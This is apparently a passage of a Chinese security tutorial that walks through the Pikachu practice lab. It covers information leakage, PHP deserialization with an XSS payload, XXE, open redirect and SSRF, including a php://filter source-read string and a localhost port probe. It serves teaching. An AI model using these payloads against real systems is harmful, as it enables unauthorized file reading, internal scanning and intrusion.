    ---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;
    类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。 
    我们打开源码搜索得到测试账号。
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2c9ab38ae1024c5badb299852161c4c6.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
也可直接输入url，进入。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F57aca0eaf0974baca5af6d5f7378cea3.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.12 PHP反序列化漏洞

在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。-
序列化serialize()-
序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F540ecf6774c64f1db6d26ebc75aecf70.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
反序列化unserialize()就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。

     $u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
        echo $u->test; //得到的结果为pikachu
        
    
        

序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题

> 常见的几个魔法函数:-
> \_\_construct()当一个对象创建时被调用-
> \_\_destruct()当一个对象销毁时被调用-
> \_\_toString()当一个对象被当作一个字符串使用-
> \_\_sleep() 在对象在被序列化之前运行-
> \_\_wakeup将在序列化之后立即被调用

     漏洞举例:
     class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);
    
        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
    
        

随意输入一串字符，都会提示一句话。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc841dc6a5fe14ee58bc28977f710c71e.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff0c1ee09709f4015a69f1291a5e10363.png)-
通过该代码将class a序列化为

    O:1:"s":1:{s:4:"test";s:30:"<script>alert('fxlh')</script>";}
    
    
        

然后将该序列化后的类传入后台，后台接受后就会将接受到的类进行反序列化，在后面接着使用。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc0f92e960cb447eba60bbe85f51c13b.png)-
在将序列化后的类执行时，可能会调用相应的构造方法，通过这些构造方法，就会对反序列化的代码执行，造成一些不可预计的后果。但是在实际情况中，我们往往需要构造多种payload，来测试出后台往往是使用哪种构造方法，并使用。

## 3.13 XXE（XML外部实体攻击）

XXE -“xml external entity injection”-
既"xml外部实体注入漏洞"。-
概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"-
也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。-
xml:

    <!--第一部分: XML声明-- >
    <?xml version="1.0"?>
    <!--第二部分:文档类型定义DTID- >
    <!DOCTYPE note[ <!--定义此文档是 note类型的文档--> 
    <!ENTITY entity - name SYSTEM "URL/URL"> <!- 外部实体声 明-->
    ]]>
    <1--第三部分:文档元>
    <note>
    <to>Dave</to>
    <from> Tom</from>
    <head> Reminder </head>
    <body>You are a good man</body>
    </note>
    
        

DTD：Document Type Definition即文档类型定义，用来为XML文档定义语义约束。

    1.DTD内部声明
    <!DOCTYPE 根元素[元素声明]>
    2. DTD外部引用
    <!DOCTYPE根元素名称SYSTEM “"外部DTD的URI" >
    3.引用公共DTD
    <!DOCTYPE根元素名称PUBLIC "DTD标识名” “公用DTD的URI” >
    
        

如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可-
能导致XXE漏洞。-
simplexml load string()函数转换形式良好的XML字符串为SimpleXMLElement对象-
XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML。-
我们输入

    <?xml version = "1.0"?> 
    <!DOCTYPE note [     <!ENTITY hacker "xxe"> ]> 
    <name>&hacker;</name>
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6ee05e89937641689437220c05e1f9c4.png)

## 3.14 不安全的URL重定向

不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。-
如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话-
就可能发生"跳错对象"的问题。

url跳转比较直接的危害是:-
–>钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站

这个漏洞比较简单,come on,来测一把!-
看到有一些超链接，我们都点一遍可以发现，最后一个好像有个url的值，我们修改成https://www.baidu.com/，可以发现它跳转成https://www.baidu.com/页面了-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcd474e83fa854c4b933349d4269f4b35.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F34ab2ad79acb4cf5b9203a7cda77dcd0.png)-
熟练后可以的定向转到提前搭建好的恶意站点。

## 3.15 SSRF（服务器端请求伪造）

SSRF(Server-Side Request Forgery:服务器端请求伪造)

其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制-
导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据

数据流:攻击者----->服务器---->目标地址

根据后台使用的函数的不同,对应的影响和利用方法又有不一样

PHP中下面函数的使用不当会导致SSRF:-
file\_get\_contents()-
fsockopen()-
curl\_exec()

如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。

打开ssrf(curl)，点击a标签，显示一首诗。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F26778ed40f9f4824a946a6d3c8fc0ffb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F745b95f2ca0446ae8b52df8a558168d4.png)-
看到这个url没有，估计就是这个url导致的跳转，我们输入https://www.baidu.com可以发现百度过来了-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fced122e7ae7e4c9792984396b965b16e.png)-
打开ssrf(file\_get\_content)，反正都读了,那就在来一首吧。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0623aaeaaca74e20ad91052b7ebea0f1.png)-
同样可以修改成百度。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1c5793b37223459fa425a5fd8474d1ba.png)-
读取PHP文件的源码:`php://filter/read=convert.base64-encode/resource=ssrf.php`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe1bbe6ec59e54f6b86b768e9f0ce44fe.png)-
编码形式转换即可。-
内网请求:http://x.x.x.x/xx.index-
eg:-
payload：http://127.0.0.1:22(探测这台主机内网的这台主句的22端口是否开启)

## 参考资料

Web安全从入门到放弃：https://www.ichunqiu.com/course/63838-
皮卡丘靶场：https://github.com/zhuifengshaonianhanlu/pikachu-
w3school HTML DOM:https://www.w3school.com.cn/js/js\_htmldom.asp

[查看原网页: blog.csdn.net](https://blog.csdn.net/qq_53571321/article/details/121692906)






# Quote
